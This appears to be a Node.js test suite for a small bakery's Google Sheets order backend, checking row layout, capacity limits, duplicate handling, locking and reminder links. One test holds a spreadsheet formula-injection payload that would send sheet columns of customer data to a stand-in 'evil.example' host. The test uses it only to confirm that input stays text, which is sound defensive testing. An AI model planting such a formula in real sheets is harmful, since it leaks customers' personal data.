'use strict';
/*
 * Runs the real generated apps-script/dist/Code.gs against a small fake of Google's
 * SpreadsheetApp, so the sheet layout, numbering, locking and parsing are tested
 * without a Google account. It is a fake: real Google behavior must still be checked
 * once with a test order after setup (see the owners' private setup guide).
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { execFileSync } = require('node:child_process');

const ROOT = path.join(__dirname, '..', '..');
execFileSync(process.execPath, [path.join(ROOT, 'tools', 'build-apps-script.js')]);
const SOURCE = fs.readFileSync(path.join(ROOT, 'apps-script', 'dist', 'Code.gs'), 'utf8');

// ---- fake Google services ----------------------------------------------------------

function a1(ref) {
  const cell = (s) => {
    const m = /^([A-Z]+)(\d+)$/.exec(s);
    let col = 0;
    for (const ch of m[1]) col = col * 26 + ch.charCodeAt(0) - 64;
    return [Number(m[2]), col];
  };
  const [a, b] = ref.split(':');
  const [r1, c1] = cell(a);
  const [r2, c2] = b ? cell(b) : [r1, c1];
  return [r1, c1, r2 - r1 + 1, c2 - c1 + 1];
}

// Mimic how Sheets stores values written with setValues ("as if typed"):
// plain-text columns keep text; a leading ' keeps text; = + - @ start a formula; number-like text becomes a number.
function stored(sheet, r, c, v) {
  if (typeof v !== 'string') return v;
  if (sheet.textCols.has(c) && r > 1) return v;
  if (v.startsWith("'")) return v.slice(1);
  if (/^[=+\-@]/.test(v) && !/^-?\d+(\.\d+)?$/.test(v)) { sheet.formulas.set(r + ',' + c, v); return v; }
  if (/^-?\d+(\.\d+)?$/.test(v)) return Number(v);
  return v;
}

function fakeSheet(name) {
  const cells = new Map();
  const sheet = {
    name, formulas: new Map(), checkboxes: new Set(), validations: [], rules: [], textCols: new Set(),
    get(r, c) { return cells.has(r + ',' + c) ? cells.get(r + ',' + c) : ''; },
    set(r, c, v) { cells.set(r + ',' + c, v); },
    getLastRow() {
      let last = 0;
      for (const [k, v] of cells) if (v !== '' && v !== null) last = Math.max(last, Number(k.split(',')[0]));
      return last;
    },
    maxRows: 1000,
    getMaxRows() { return sheet.maxRows; },
    insertRowsAfter(after, n) { assert.equal(after, sheet.maxRows); sheet.maxRows += n; },
    getRange(r, c, nr, nc) {
      if (typeof r === 'string') [r, c, nr, nc] = a1(r);
      nr = nr || 1; nc = nc || 1;
      const range = {
        getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => sheet.get(r + i, c + j))),
        getValue: () => sheet.get(r, c),
        setValues: (rows) => {
          assert.equal(rows.length, nr); assert.equal(rows[0].length, nc, 'setValues width must match range');
          rows.forEach((row, i) => row.forEach((v, j) => sheet.set(r + i, c + j, stored(sheet, r + i, c + j, v))));
          return range;
        },
        setValue: (v) => { sheet.set(r, c, stored(sheet, r, c, v)); return range; },
        setFormula: (f) => { sheet.formulas.set(r + ',' + c, f); sheet.set(r, c, f); return range; },
        insertCheckboxes: () => { sheet.checkboxes.add(r + ',' + c); return range; },
        setDataValidation: (v) => { sheet.validations.push({ r, c, nr, nc, v }); return range; }
      };
      range.setNumberFormat = (fmt) => { if (fmt === '@' && nc === 1) sheet.textCols.add(c); return range; };
      for (const m of ['setFontWeight', 'setBackground']) range[m] = () => range;
      return range;
    },
    setFrozenRows() {}, setFrozenColumns() {}, setColumnWidth() {},
    setConditionalFormatRules(rules) { sheet.rules = rules; },
    clear() { cells.clear(); sheet.formulas.clear(); }
  };
  return sheet;
}

function chain(record) {
  return new Proxy({}, { get: (_, prop) => (prop === 'build' ? () => record : (...args) => { record[prop] = args; return chain(record); }) });
}

function makeEnv(nowIso) {
  const sheets = new Map();
  const ss = {
    getSheetByName: (n) => sheets.get(n) || null,
    insertSheet: (n) => { const s = fakeSheet(n); sheets.set(n, s); return s; }
  };
  const lock = { held: false, busy: false, tryLock() { if (lock.busy) return false; lock.held = true; return true; }, releaseLock() { lock.held = false; } };
  const RealDate = Date;
  class FakeDate extends RealDate {
    constructor(...a) { if (a.length) super(...a); else super(env.now); }
    static now() { return new RealDate(env.now).getTime(); }
  }
  const env = {
    now: nowIso, sheets, lock,
    ctx: {
      Date: FakeDate, Intl, URLSearchParams, JSON, Math, Number, String, Object, Array, Error, encodeURIComponent,
      SpreadsheetApp: {
        getActiveSpreadsheet: () => ss,
        flush: () => {},
        newDataValidation: () => chain({}),
        newConditionalFormatRule: () => chain({})
      },
      LockService: { getScriptLock: () => lock },
      ContentService: {
        MimeType: { JSON: 'json' },
        createTextOutput: (s) => ({ body: s, setMimeType() { return this; } })
      },
      Utilities: {
        formatDate: (d, tz, fmt) => {
          const p = {};
          new Intl.DateTimeFormat('en-GB', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', hourCycle: 'h23' })
            .formatToParts(d).forEach((x) => { p[x.type] = x.value; });
          return fmt.replace('yyyy', p.year).replace('MM', p.month).replace('dd', p.day).replace('HH', p.hour).replace('mm', p.minute);
        }
      }
    }
  };
  vm.createContext(env.ctx);
  vm.runInContext(SOURCE, env.ctx, { filename: 'Code.gs' });
  env.post = (payload) => JSON.parse(env.ctx.doPost({ postData: { contents: typeof payload === 'string' ? payload : JSON.stringify(payload) } }).body);
  env.get = (params) => JSON.parse(env.ctx.doGet({ parameter: params }).body);
  env.row = (sheetName, r) => {
    const s = sheets.get(sheetName);
    const cols = env.ctx.COLUMNS;
    const o = {};
    cols.forEach((h, i) => { o[h] = s.get(r, i + 1); });
    return o;
  };
  return env;
}

const THURSDAY = '2026-11-05T08:00:00Z';
let n = 0;
const order = (over = {}) => Object.assign({
  orderId: 'sheet-test-' + String(++n).padStart(4, '0'), name: 'Test Customer', phone: '054-000-0000',
  items: { plain: 1, pesto: 1 }, method: 'delivery', address: '1 Test St, Ra\'anana', payment: 'bit',
  date: '2026-11-10', notes: 'no sesame', lang: 'en'
}, over);

// ---- tests ---------------------------------------------------------------------------------

test('setup creates the order, test, settings and summary tabs', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  assert.deepEqual([...env.sheets.keys()].sort(), ['Bake summary', 'Settings', 'Test orders', 'Website orders']);
  const orders = env.sheets.get('Website orders');
  assert.equal(orders.get(1, 1), 'Order #');
  assert.equal(orders.get(1, env.ctx.COLUMNS.length), 'Order ID');
  assert.equal(env.sheets.get('Settings').get(2, 2), 18);
  assert.equal(orders.rules.length, 2, 'unpaid and canceled highlighting');
  const summary = env.sheets.get('Bake summary').formulas.get('2,1');
  assert.match(summary, /^=QUERY\('Website orders'!A2:Z, "select C, sum\(J\), sum\(K\), sum\(L\), sum\(M\), sum\(N\), sum\(O\), sum\(P\), sum\(Q\) where C is not null and X <> 'canceled' group by C/);
  assert.match(env.sheets.get('Bake summary').formulas.get('2,12'), /where C is not null and I = 'Bit' and not W = true and X <> 'canceled'/);
  // Running setup again keeps settings Eliana changed
  env.sheets.get('Settings').set(2, 2, 12);
  env.ctx.setup();
  assert.equal(env.sheets.get('Settings').get(2, 2), 12);
});

test('an order lands in the sheet as one complete row', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const r = env.post(order({ orderId: 'sheet-row-0001' }));
  assert.equal(r.ok, true);
  assert.equal(r.orderNumber, 1001);
  assert.equal(r.total, 90);
  const row = env.row('Website orders', 2);
  assert.equal(row['Order #'], 1001);
  assert.equal(row.Received, '2026-11-05 10:00', 'Israel time');
  assert.equal(row['Delivery date'], '2026-11-10');
  assert.equal(row.Day, 'Tuesday');
  assert.equal(row.Phone, '0540000000', 'leading zero kept');
  assert.equal(row['Pickup / delivery'], 'Delivery');
  assert.equal(row['Pays by'], 'Bit');
  assert.equal(row['Plain sourdough'], 1);
  assert.equal(row.Pesto, 1);
  assert.equal(row.Garlic, '');
  // Totals are formulas, so they follow quantities edited by hand
  assert.equal(row.Loaves, '=SUM(J2:P2)');
  assert.equal(row['Subtotal ₪'], '=N(J2)*35+N(K2)*42+N(L2)*44+N(M2)*42+N(N2)*44+N(O2)*44+N(P2)*50');
  assert.equal(row['Delivery ₪'], '=IF(AND(G2="Delivery",R2<100),5,0)');
  assert.equal(row['Total ₪'], '=R2+S2');
  assert.equal(row.Notes, 'no sesame');
  assert.equal(row.Paid, false);
  assert.equal(row.Status, 'new');
  assert.equal(row['Payment reminder'],
    '=IF(W2=TRUE,"",HYPERLINK("https://wa.me/972540000000?text="&ENCODEURL("Hi Test Customer, this is The Bread Club. ' +
    'A quick reminder that your order (#1001) for Tuesday 10.11 comes to ₪"&T2&". You can pay by Bit to 054-911-2175 ' +
    '(please write your full name in the note). Thank you"),"Send reminder"))');
  assert.equal(row['Order ID'], 'sheet-row-0001');
  assert.ok(env.sheets.get('Website orders').checkboxes.has('2,' + (env.ctx.COLUMNS.indexOf('Paid') + 1)));
  assert.equal(env.lock.held, false, 'lock released');
});

test('customer text can never become a formula in the sheet', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const evil = '=IMAGE("https://evil.example/?"&TEXTJOIN(",",1,E2:F200))';
  const r = env.post(order({ name: '=HYPERLINK("x") "Bob"', address: '+972 street 4', notes: evil }));
  assert.equal(r.ok, true);
  const sheet = env.sheets.get('Website orders');
  const cols = env.ctx.COLUMNS;
  for (const c of ['Name', 'Address', 'Notes']) {
    assert.equal(sheet.formulas.has('2,' + (cols.indexOf(c) + 1)), false, c + ' must stay text');
  }
  const row = env.row('Website orders', 2);
  assert.equal(row.Name, '=HYPERLINK("x") "Bob"');
  assert.equal(row.Address, '+972 street 4');
  assert.equal(row.Notes, evil);
  // quotes in a name cannot break out of the reminder formula
  assert.match(row['Payment reminder'], /ENCODEURL\("Hi =HYPERLINK\(""x""\) ""Bob"", this is/);
  env.post(order({ notes: '- no sesame' }));
  assert.equal(env.row('Website orders', 3).Notes, '- no sesame');
});

test('cash orders say "Cash at door" and get no payment reminder', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  env.post(order({ payment: 'cash' }));
  const row = env.row('Website orders', 2);
  assert.equal(row['Pays by'], 'Cash at door');
  assert.equal(row['Payment reminder'], '');
  const dup = env.post(Object.assign(order(), { orderId: row['Order ID'] }));
  assert.equal(dup.payment, 'cash');
});

test('retrying the same order does not add a second row', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const o = order();
  const a = env.post(o);
  const b = env.post(o);
  assert.equal(b.duplicate, true);
  assert.equal(b.orderNumber, a.orderNumber);
  assert.equal(b.payment, 'bit');
  assert.equal(b.method, 'delivery');
  assert.equal(env.sheets.get('Website orders').getLastRow(), 2);
});

test('capacity and closed days come from the Settings tab', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const settings = env.sheets.get('Settings');
  settings.set(2, 2, 3);
  settings.set(6, 1, new Date('2026-11-12T22:00:00Z')); // a real date cell: Friday 13 Nov in Israel
  assert.deepEqual(env.get({ action: 'availability' }).dates.map((d) => d.date), ['2026-11-10', '2026-11-17']);
  assert.equal(env.post(order({ items: { plain: 3 } })).ok, true);
  assert.deepEqual(env.post(order({ items: { plain: 1 } })), { ok: false, error: 'full', date: '2026-11-10', remaining: 0 });
  assert.equal(env.post(order({ date: '2026-11-13' })).fields.date, 'closed');
  assert.equal(env.get({ action: 'availability' }).dates[0].soldOut, true);
});

test('an order canceled in the sheet frees its loaves; hand-typed rows count', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const sheet = env.sheets.get('Website orders');
  env.post(order({ items: { plain: 17 } }));
  // Eliana types a phone order by hand (no order ID) for 1 loaf
  const cols = env.ctx.COLUMNS;
  sheet.set(3, 1, 7); sheet.set(3, cols.indexOf('Delivery date') + 1, "'2026-11-10");
  sheet.set(3, cols.indexOf('Loaves') + 1, 1); sheet.set(3, cols.indexOf('Status') + 1, 'New');
  assert.equal(env.post(order({ items: { plain: 1 } })).error, 'full');
  sheet.set(2, cols.indexOf('Status') + 1, 'canceled');
  const r = env.post(order({ items: { plain: 1 } }));
  assert.equal(r.ok, true);
  assert.equal(r.orderNumber, 1002);
});

test('a bad or blank capacity value in Settings falls back to 18', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  for (const v of ['eighteen', '', -1, 2.5]) {
    env.sheets.get('Settings').set(2, 2, v);
    assert.equal(env.get({ action: 'availability' }).dates[0].remaining, 18, JSON.stringify(v));
  }
});

test('editing quantities in the sheet changes the day count and the total', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const sheet = env.sheets.get('Website orders');
  const cols = env.ctx.COLUMNS;
  const o = order({ items: { plain: 10 } });
  env.post(o);
  sheet.set(2, cols.indexOf('Plain sourdough') + 1, 4); // Eliana changes 10 -> 4
  assert.equal(env.get({ action: 'availability' }).dates[0].remaining, 14);
  const dup = env.post(o);
  assert.equal(dup.loaves, 4);
  assert.equal(dup.total, 140, '4 x 35, free delivery from 100');
});

test('hand-typed rows: phone without leading 0 and Loaves-only rows are understood', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const sheet = env.sheets.get('Website orders');
  const cols = env.ctx.COLUMNS;
  for (let i = 0; i < 3; i++) {
    sheet.set(2 + i, 1, 900 + i);
    sheet.set(2 + i, cols.indexOf('Delivery date') + 1, '2026-11-10');
    sheet.set(2 + i, cols.indexOf('Phone') + 1, 540000000); // number: leading 0 lost
    sheet.set(2 + i, cols.indexOf('Loaves') + 1, 1);
    sheet.set(2 + i, cols.indexOf('Status') + 1, 'new');
  }
  assert.equal(env.get({ action: 'availability' }).dates[0].remaining, 15);
  assert.equal(env.post(order()).ok, true, 'same phone may order again');
});

test('test orders go to the Test orders tab only', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const r = env.post(order({ test: true }));
  assert.equal(r.ok, true);
  assert.equal(env.sheets.get('Test orders').getLastRow(), 2);
  assert.equal(env.sheets.get('Website orders').getLastRow(), 1);
  assert.equal(env.get({ action: 'availability', test: '1' }).dates[0].remaining, 16);
  assert.equal(env.get({ action: 'availability' }).dates[0].remaining, 18);
});

test('bad requests, busy lock and missing setup fail safely', () => {
  const env = makeEnv(THURSDAY);
  assert.deepEqual(env.post('{not json'), { ok: false, error: 'bad_request' });
  assert.deepEqual(env.get({ action: 'availability' }), { ok: false, error: 'server' }, 'setup() not run yet');
  assert.deepEqual(env.post(order()), { ok: false, error: 'server' });
  assert.deepEqual(env.get({}), { ok: true, service: 'the-bread-club-orders' });
  env.ctx.setup();
  env.lock.busy = true;
  assert.deepEqual(env.post(order()), { ok: false, error: 'busy' });
  assert.equal(env.sheets.get('Website orders').getLastRow(), 1);
});

test('Hebrew orders are labelled and get a Hebrew reminder', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  env.post(order({ lang: 'he', method: 'pickup' }));
  const row = env.row('Website orders', 2);
  assert.equal(row.Language, 'Hebrew');
  assert.equal(row['Pickup / delivery'], 'Pickup');
  assert.equal(row.Address, '');
  assert.match(row['Payment reminder'], /ENCODEURL\("היי Test Customer, כאן The Bread Club\. תזכורת קטנה: ההזמנה שלך \(#1001\) ליום שלישי 10\.11 יוצאת ₪"&T2&"\. אפשר לשלם בביט/);
});

test('when the sheet runs out of rows, more are added with the same formats', () => {
  const env = makeEnv(THURSDAY);
  env.ctx.setup();
  const sheet = env.sheets.get('Website orders');
  sheet.maxRows = 3; // pretend the sheet is nearly full
  env.ctx.formatOrderRows(sheet);
  sheet.textCols.clear();
  env.post(order({ items: { plain: 1 } }));
  env.post(order({ items: { plain: 1 }, phone: '0520000000' }));
  env.post(order({ items: { plain: 1 }, phone: '0530000000' })); // row 4: past the end
  assert.equal(sheet.maxRows, 503);
  assert.equal(sheet.getLastRow(), 4);
  assert.equal(env.row('Website orders', 4).Phone, '0530000000');
  assert.ok(sheet.textCols.has(env.ctx.COLUMNS.indexOf('Phone') + 1), 'new rows formatted');
});
